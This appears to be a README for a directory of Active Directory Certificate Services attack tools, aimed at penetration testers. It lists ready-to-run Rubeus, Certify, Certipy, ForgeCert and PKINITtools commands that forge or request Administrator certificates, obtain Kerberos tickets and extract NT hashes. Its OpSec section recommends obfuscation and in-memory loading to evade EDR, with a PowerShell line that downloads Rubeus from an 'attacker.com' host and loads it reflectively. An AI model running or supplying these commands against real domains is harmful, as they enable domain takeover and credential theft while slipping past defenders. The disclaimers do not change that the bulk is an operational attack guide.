# ADCS Attack Tools

## Overview

This directory contains compiled binaries and tools for ADCS exploitation.

**WARNING**: These tools should only be used in authorized penetration testing engagements, security research, or controlled lab environments.

---

## Tools Included

### Rubeus.dll / rub.exe
**Purpose**: Kerberos attack toolkit
**Key Features**:
- Request TGT using certificates (PKINIT)
- Ticket manipulation and forgery
- Kerberoasting
- AS-REP roasting

**Usage for ADCS**:
```powershell
# Request TGT with certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt

# Request TGT and display base64
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /nowrap
```

**Download**: https://github.com/GhostPack/Rubeus

---

### cert.exe (Certify)
**Purpose**: Certificate template enumeration and abuse
**Key Features**:
- Enumerate vulnerable certificate templates
- Request certificates with arbitrary SANs
- Identify ESC1-ESC8 vulnerabilities
- Certificate manipulation

**Usage**:
```powershell
# Enumerate all certificate templates
.\cert.exe find

# Find vulnerable templates
.\cert.exe find /vulnerable

# Request certificate with arbitrary SAN (ESC1)
.\cert.exe request /ca:DC01.corp.local\corp-DC01-CA /template:VulnerableTemplate /altname:Administrator
```

**Download**: https://github.com/GhostPack/Certify

---

## Additional Recommended Tools

### Certipy (Python)
```bash
pip3 install certipy-ad

# Enumerate
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable

# Exploit ESC1
certipy req -u 'user@corp.local' -p 'Password123' -ca 'CORP-CA' -target ca.corp.local -template VulnerableTemplate -upn administrator@corp.local

# Authenticate and get hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ForgeCert
**Purpose**: Forge certificates from SubCA certificates (ESC2)

```bash
ForgeCert.exe --CaCertPath subca.pfx --CaCertPassword password --Subject "CN=Administrator" --SubjectAltName "administrator@corp.local" --NewCertPath admin.pfx --NewCertPassword password
```

### PKINITtools
**Purpose**: Certificate-based Kerberos authentication

```bash
# Get TGT with certificate
python3 gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass password corp.local/administrator administrator.ccache

# Get NT hash from TGT
python3 getnthash.py corp.local/administrator -key <AS-REP-key>
```

---

## Tool Compatibility Matrix

| Tool | Platform | ESC1 | ESC2 | ESC3 | ESC4 | ESC6 | ESC8 |
|------|----------|------|------|------|------|------|------|
| Certify | Windows | ✓ | ✓ | ✓ | ✓ | ✓ | - |
| Rubeus | Windows | ✓ | ✓ | ✓ | ✓ | ✓ | - |
| Certipy | Linux/Win | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| ForgeCert | Windows | - | ✓ | - | - | - | - |
| PKINITtools | Linux | ✓ | ✓ | ✓ | ✓ | ✓ | - |
| ntlmrelayx | Linux | - | - | - | - | - | ✓ |

---

## Building from Source

### Rubeus
```powershell
# Clone repository
git clone https://github.com/GhostPack/Rubeus

# Open in Visual Studio
# Build > Build Solution

# Output: Rubeus\bin\Release\Rubeus.exe
```

### Certify
```powershell
# Clone repository
git clone https://github.com/GhostPack/Certify

# Open in Visual Studio
# Build > Build Solution

# Output: Certify\bin\Release\Certify.exe
```

---

## Operational Security (OpSec) Notes

### Detection Risks

**Certify.exe / cert.exe:**
- High detection risk on endpoints with EDR
- Consider running from memory
- Use obfuscated versions if available

**Rubeus.exe:**
- Often flagged by AV/EDR
- Consider using built-in Windows tools where possible
- Obfuscation or .NET reflection loading recommended

**Certipy:**
- Lower detection risk (Python, runs on attacker machine)
- Network traffic may be logged
- Consider using over VPN/proxies

### Evasion Techniques

```powershell
# Load Rubeus from memory
$data = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("asktgt /user:Administrator /certificate:admin.pfx /ptt".Split())

# Use native Windows tools where possible
certreq.exe -new request.inf request.req
certreq.exe -submit -config "CA.corp.local\CORP-CA" request.req cert.cer
```

---

## Legal and Ethical Use

**CRITICAL**: These tools are for:
- Authorized penetration testing only
- Security research in controlled environments
- Defensive security analysis
- Educational purposes in isolated labs

**NEVER**:
- Use without explicit written authorization
- Deploy in production environments
- Use for malicious purposes

Unauthorized access to computer systems is illegal under CFAA and equivalent laws worldwide.

---

## References

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Certify GitHub](https://github.com/GhostPack/Certify)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [SpecterOps ADCS Research](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

---

**Maintained by**: ADCS Attack Research Team
**Last Updated**: November 2025
